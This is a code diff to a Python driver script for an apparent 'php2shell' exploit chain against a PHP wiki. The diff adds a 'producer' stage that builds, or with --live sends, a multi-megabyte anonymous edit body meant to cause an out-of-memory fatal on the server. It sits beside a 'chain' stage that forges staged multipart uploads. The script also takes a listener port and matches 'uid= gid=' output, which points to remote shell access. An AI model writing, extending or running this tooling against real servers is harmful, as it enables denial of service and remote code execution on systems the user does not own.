@@ -19,6 +19,7 @@ HERE = Path(__file__).resolve().parent
 sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
+from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.stages import probe as probe_stage  # noqa: E402
 
 
@@ -65,6 +66,29 @@ ID_LINE = re.compile(
     rb"(?m)^uid=[0-9]+\([A-Za-z0-9_.-]+\) "
     rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
 )
+
+# argv-driven stage list (receipt ladder order): producer -> chain; recon reads.
+STAGES = ("recon", "producer", "chain")
+
+
+def run_producer_step(
+    host: str,
+    port: int,
+    host_header: str,
+    body_bytes: int,
+    output: Path,
+    live: bool,
+    timeout: float,
+) -> tuple[dict, Path]:
+    """Producer stage entrypoint: dry byte-build by default, --live to fire."""
+    if live:
+        summary = producer_stage.fire(host, port, body_bytes, output, timeout=timeout)
+    else:
+        summary = producer_stage.dry(host_header, body_bytes, output)
+    summary["step"] = "producer"
+    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+    (output / "result.json").write_text(rendered)
+    return summary, output / "result.json"
 
 
 def parse_url(value: str) -> tuple[str, int, str, str]:
@@ -403,8 +427,9 @@ def run_recon(
 
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="php2shell chain driver: --step recon (read-only receipt) or "
-        "--step chain (blocker-hold + rearm + forged staged multipart)"
+        description="php2shell chain driver: --step recon (read-only receipt), "
+        "--step producer (fpmwiki producer: offline byte-build default, --live "
+        "to fire), or --step chain (blocker-hold + rearm + forged staged multipart)"
     )
     parser.add_argument(
         "--target",
@@ -413,7 +438,7 @@ def main() -> int:
         "or an http:// URL for a one-off exchange (legacy usage)",
     )
     parser.add_argument("--url", default=None, help="explicit target URL override")
-    parser.add_argument("--step", required=True, choices=("recon", "chain"))
+    parser.add_argument("--step", required=True, choices=STAGES)
     parser.add_argument(
         "--profile",
         default=None,
@@ -432,6 +457,24 @@ def main() -> int:
     parser.add_argument("--settle-seconds", default=8.0, type=float)
     parser.add_argument("--recovery-seconds", default=2.0, type=float)
     parser.add_argument("--timeout", default=120.0, type=float)
+    # producer stage (--step producer): offline-first, dry is the default
+    parser.add_argument(
+        "--body-bytes",
+        type=int,
+        default=producer_stage.DEFAULT_BODY_BYTES,
+        help="producer: wpTextbox1 'A'*N size, int N (5.7M anonymous-edit OOM "
+        "receipt; ladder 5.7M-6.0M fatal, 9M past the post_max_size ceiling)",
+    )
+    live_group = parser.add_mutually_exclusive_group()
+    live_group.add_argument(
+        "--live",
+        action="store_true",
+        help="producer: actually send (default: build + record request bytes only)",
+    )
+    live_group.add_argument("--dry-run", action="store_true", help="default, accepted explicitly")
+    live_group.add_argument("--build-only", action="store_true", help="alias of --dry-run")
+
+
     parser.add_argument(
         "--strict-derive",
         action="store_true",
@@ -481,6 +524,12 @@ def main() -> int:
     if not 1 <= args.lport <= 65535:
         parser.error("lport must be between 1 and 65535")
 
+    if args.step == "producer":
+        try:
+            producer_stage.validate_body_bytes(args.body_bytes)
+        except (TypeError, ValueError) as error:
+            parser.error(f"--body-bytes: {error}")
+
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
         args.output = HERE.parent / "files" / "io" / f"{target_name or 'adhoc'}-{args.step}-{stamp}"
@@ -504,6 +553,25 @@ def main() -> int:
             args.output, strict=args.strict_derive,
         )
         summary = result
+    elif args.step == "producer":
+        try:
+            summary, _receipt = run_producer_step(
+                host, port, host_header, args.body_bytes, args.output,
+                live=args.live, timeout=args.timeout,
+            )
+        except (ConnectionError, OSError, TimeoutError, ValueError) as error:
+            summary = {
+                "step": "producer",
+                "host": host,
+                "port": port,
+                "path": path,
+                "body_bytes": args.body_bytes,
+                "error": f"{type(error).__name__}: {error}",
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
     else:
         blockers = []
         attempts = []
@@ -573,6 +641,10 @@ def main() -> int:
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (args.output / "result.json").write_text(rendered)
     print(rendered, end="")
+    if args.step == "producer":
+        # producer dry build: 0 = recorded; 2 = over the post_max_size ceiling
+        # (byte templates are still recorded, but --live would refuse to send)
+        return 2 if summary.get("over_budget") else 0
     # recon exit code: 0 = worker responded with a parseable HTTP exchange;
     # arm/probe field-level outcomes live in the receipt for human review.
     return 0 if summary.get("preflight", {}).get("alive") else 2
